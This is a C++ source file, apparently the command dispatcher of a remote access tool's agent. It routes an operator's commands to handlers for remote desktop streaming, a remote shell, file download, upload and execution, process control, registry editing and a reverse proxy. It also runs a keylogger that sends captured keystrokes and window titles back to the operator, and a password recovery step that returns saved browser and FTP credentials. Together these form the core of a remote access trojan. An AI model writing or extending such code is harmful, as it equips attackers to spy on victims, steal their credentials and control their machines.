#include "AgentMessageDispatcher.h"
#include "Base64Helper.h"
#include "FileManagerHandler.h"
#include "RemoteShellHandler.h"
#include "RemoteDesktopHandler.h"
#include "TaskManagerHandler.h"
#include "KeyloggerHandler.h"
#include "SystemInformationHandler.h"
#include "PasswordRecoveryHandler.h"
#include "RegistryHandler.h"
#include "ReverseProxyHandler.h"
#include "FileType.h"
#include <chrono>
#include <iostream>

namespace rslm {
    namespace client {
        namespace agent {

            static std::string g_agentId;
            static SendFn g_send;
            static SendFn g_push;
            static std::string g_adminId;

            void AgentMessageDispatcher::Configure(const std::string& agentId, SendFn send, SendFn push) {
                g_agentId = agentId;
                g_send = std::move(send);
                g_push = std::move(push);
            }

            void AgentMessageDispatcher::Reply(const net::Message& request, const net::json& payload) {
                if (g_send)
                    g_send(net::Message::CreateResponse(request, payload));
            }

            void AgentMessageDispatcher::ReplyError(const net::Message& request, const std::string& error) {
                if (g_send)
                    g_send(net::Message::CreateError(request, error));
            }

            void AgentMessageDispatcher::Dispatch(const net::Message& request) {
                using namespace net::MessageType;
                g_adminId = request.senderId;

                const auto& p = request.payload;

                // --- Remote Desktop ---
                if (request.type == DESKTOP_START) {
                    int quality = p.value("quality", 75);
                    int fps = p.value("fps", 10);

                    messages::RemoteDesktopHandler::Start(quality, fps,
                        [](const std::vector<uint8_t>& jpeg, int width, int height) {
                            if (!g_push) return;
                            net::json payload = {
                                {"width", width},
                                {"height", height},
                                {"format", "jpeg"},
                                {"data", util::Base64Encode(jpeg)}
                            };
                            auto frame = net::Message::CreateRequest(
                                DESKTOP_FRAME, g_agentId, g_adminId, payload);
                            g_push(frame);
                        });

                    Reply(request, { {"status", "streaming"} });
                    return;
                }

                if (request.type == DESKTOP_STOP) {
                    messages::RemoteDesktopHandler::Stop();
                    Reply(request, { {"status", "stopped"} });
                    return;
                }

                if (request.type == DESKTOP_MOUSE) {
                    messages::RemoteDesktopHandler::SendMouseEvent(
                        p.value("x", 0), p.value("y", 0),
                        p.value("action", 0), p.value("wheelDelta", 0));
                    Reply(request, { {"status", "ok"} });
                    return;
                }

                if (request.type == DESKTOP_KEYBOARD) {
                    messages::RemoteDesktopHandler::SendKeyEvent(
                        p.value("keyCode", 0), p.value("keyDown", true));
                    Reply(request, { {"status", "ok"} });
                    return;
                }

                // --- Remote Shell ---
                if (request.type == SHELL_OPEN) {
                    bool opened = messages::RemoteShellHandler::Open(
                        [](const std::string& output) {
                            if (!g_push) return;
                            net::json payload = { {"output", output} };
                            auto msg = net::Message::CreateRequest(
                                SHELL_OUTPUT, g_agentId, g_adminId, payload);
                            g_push(msg);
                        },
                        []() {});

                    if (opened) {
                        Reply(request, {
                            {"status", "open"},
                            {"prompt", messages::RemoteShellHandler::GetPrompt()}
                            });
                    }
                    else {
                        ReplyError(request, "Failed to open shell");
                    }
                    return;
                }

                if (request.type == SHELL_COMMAND) {
                    if (!messages::RemoteShellHandler::IsOpen()) {
                        messages::RemoteShellHandler::Open(
                            [](const std::string& output) {
                                if (!g_push) return;
                                net::json payload = { {"output", output} };
                                auto msg = net::Message::CreateRequest(
                                    SHELL_OUTPUT, g_agentId, g_adminId, payload);
                                g_push(msg);
                            },
                            []() {});
                    }
                    messages::RemoteShellHandler::SendCommand(p.value("command", std::string()));
                    Reply(request, { {"status", "sent"} });
                    return;
                }

                if (request.type == SHELL_CLOSE) {
                    messages::RemoteShellHandler::Close();
                    Reply(request, { {"status", "closed"} });
                    return;
                }

                // --- File Manager ---
                if (request.type == FILE_LIST_REQUEST) {
                    messages::FileManagerHandler::ListFiles(p.value("path", std::string("C:\\")),
                        [&](const std::vector<models::FileInfo>& files) {
                            net::json arr = net::json::array();
                            for (const auto& f : files) {
                                arr.push_back({
                                    {"name", f.name},
                                    {"path", f.path},
                                    {"type", f.type == FileType::Directory ? "directory" : "file"},
                                    {"size", f.size}
                                    });
                            }
                            Reply(request, { {"files", arr} });
                        });
                    return;
                }

                if (request.type == FILE_DOWNLOAD_REQ) {
                    messages::FileManagerHandler::DownloadFile(p.value("path", std::string()),
                        [&](const std::vector<uint8_t>& data) {
                            Reply(request, {
                                {"path", p.value("path", std::string())},
                                {"data", util::Base64Encode(data)},
                                {"size", data.size()}
                                });
                        });
                    return;
                }

                if (request.type == FILE_UPLOAD) {
                    auto data = util::Base64Decode(p.value("data", std::string()));
                    messages::FileManagerHandler::UploadFile(
                        p.value("path", std::string()), data,
                        [&](bool ok, const std::string& err) {
                            if (ok) Reply(request, { {"status", "uploaded"} });
                            else ReplyError(request, err.empty() ? "Upload failed" : err);
                        });
                    return;
                }

                if (request.type == FILE_DELETE_REQ) {
                    messages::FileManagerHandler::Delete(p.value("path", std::string()),
                        [&](bool ok, const std::string& err) {
                            if (ok) Reply(request, { {"status", "deleted"} });
                            else ReplyError(request, err.empty() ? "Delete failed" : err);
                        });
                    return;
                }

                if (request.type == FILE_EXECUTE) {
                    messages::FileManagerHandler::Execute(p.value("path", std::string()),
                        [&](bool ok, const std::string& err) {
                            if (ok) Reply(request, { {"status", "executed"} });
                            else ReplyError(request, err.empty() ? "Execute failed" : err);
                        });
                    return;
                }

                // --- Task Manager ---
                if (request.type == TASK_LIST) {
                    messages::TaskManagerHandler::GetProcesses(
                        [&](const std::vector<models::ProcessInfo>& processes) {
                            net::json arr = net::json::array();
                            for (const auto& proc : processes) {
                                arr.push_back({
                                    {"pid", proc.pid},
                                    {"name", proc.name},
                                    {"windowTitle", proc.windowTitle},
                                    {"memoryUsage", proc.memoryUsage},
                                    {"threads", proc.threads}
                                    });
                            }
                            Reply(request, { {"processes", arr} });
                        });
                    return;
                }

                if (request.type == TASK_KILL) {
                    messages::TaskManagerHandler::KillProcess(p.value("pid", 0u),
                        [&](bool ok) {
                            Reply(request, { {"success", ok} });
                        });
                    return;
                }

                if (request.type == TASK_START) {
                    messages::TaskManagerHandler::StartProcess(p.value("path", std::string()),
                        [&](bool ok) {
                            Reply(request, { {"success", ok} });
                        });
                    return;
                }

                // --- Keylogger (avec logs) ---
                if (request.type == KEYLOG_START) {
                    std::string senderId = request.senderId;  // Copier pour la lambda
                    std::cout << "[Agent] Keylogger start requested, adminId=" << senderId << std::endl;

                    messages::KeyloggerHandler::Start(
                        [senderId](const std::string& window, const std::string& text) {
                            std::cout << "[Agent] Key captured: window=" << window << ", text=" << text << std::endl;

                            if (!g_push) {
                                std::cout << "[Agent] ERROR: g_push is null!" << std::endl;
                                return;
                            }

                            net::json payload = {
                                {"windowTitle", window},
                                {"text", text},
                                {"timestamp", std::chrono::duration_cast<std::chrono::milliseconds>(
                                    std::chrono::system_clock::now().time_since_epoch()).count()}
                            };
                            auto msg = net::Message::CreateRequest(
                                KEYLOG_DATA, g_agentId, senderId, payload);
                            g_push(msg);
                            std::cout << "[Agent] Keylog data sent" << std::endl;
                        });

                    Reply(request, { {"status", "capturing"} });
                    return;
                }

                if (request.type == KEYLOG_STOP) {
                    messages::KeyloggerHandler::Stop();
                    Reply(request, { {"status", "stopped"} });
                    return;
                }

                // --- System Info ---
                if (request.type == SYSTEM_INFO) {
                    messages::SystemInformationHandler::GetSystemInfo(
                        [&](const models::SystemInfo& info) {
                            Reply(request, {
                                {"computerName", info.computerName},
                                {"username", info.username},
                                {"osName", info.osName},
                                {"osVersion", info.osVersion},
                                {"architecture", info.architecture},
                                {"cpuCores", info.cpuCores},
                                {"totalRam", info.totalRam},
                                {"availableRam", info.availableRam},
                                {"gpu", info.gpu},
                                {"isAdmin", info.isAdmin},
                                {"ipAddress", info.ipAddress},
                                {"macAddress", info.macAddress}
                                });
                        });
                    return;
                }

                // --- Password Recovery ---
                if (request.type == PASSWD_RECOVER) {
                    auto mode = p.value("mode", std::string("all"));
                    auto callback = [&](const std::vector<models::RecoveredPassword>& passwords) {
                        net::json arr = net::json::array();
                        for (const auto& pw : passwords) {
                            arr.push_back({
                                {"url", pw.url},
                                {"username", pw.username},
                                {"password", pw.password},
                                {"application", pw.application}
                                });
                        }
                        Reply(request, { {"passwords", arr} });
                        };

                    if (mode == "browsers")
                        messages::PasswordRecoveryHandler::RecoverBrowsers(callback);
                    else if (mode == "ftp")
                        messages::PasswordRecoveryHandler::RecoverFtpClients(callback);
                    else
                        messages::PasswordRecoveryHandler::RecoverAll(callback);
                    return;
                }

                // --- Registry ---
                if (request.type == REG_READ || request.type == REG_ENUM) {
                    messages::RegistryHandler::ReadKey(p.value("path", std::string()),
                        [&](const std::vector<messages::RegistryValue>& values) {
                            net::json arr = net::json::array();
                            for (const auto& v : values) {
                                arr.push_back({ {"name", v.name}, {"type", v.type}, {"data", v.data} });
                            }
                            Reply(request, { {"values", arr} });
                        });
                    return;
                }

                if (request.type == REG_WRITE) {
                    messages::RegistryHandler::WriteValue(
                        p.value("path", std::string()),
                        p.value("name", std::string()),
                        p.value("type", std::string("REG_SZ")),
                        p.value("data", std::string()),
                        [&](bool ok) { Reply(request, { {"success", ok} }); });
                    return;
                }

                if (request.type == REG_DELETE) {
                    if (p.contains("name"))
                        messages::RegistryHandler::DeleteValue(
                            p.value("path", std::string()), p.value("name", std::string()),
                            [&](bool ok) { Reply(request, { {"success", ok} }); });
                    else
                        messages::RegistryHandler::DeleteKey(
                            p.value("path", std::string()),
                            [&](bool ok) { Reply(request, { {"success", ok} }); });
                    return;
                }

                // --- Reverse Proxy ---
                if (request.type == "proxy-start") {
                    messages::ReverseProxyHandler::Start(
                        p.value("host", std::string("127.0.0.1")),
                        static_cast<uint16_t>(p.value("port", 1080)),
                        [&](bool ok, const std::string& err) {
                            if (ok) Reply(request, { {"status", "running"} });
                            else ReplyError(request, err.empty() ? "Proxy start failed" : err);
                        });
                    return;
                }

                if (request.type == "proxy-stop") {
                    messages::ReverseProxyHandler::Stop();
                    Reply(request, { {"status", "stopped"} });
                    return;
                }

                ReplyError(request, "Unknown command type: " + request.type);
            }

        } // namespace agent
    } // namespace client
} // namespace rslm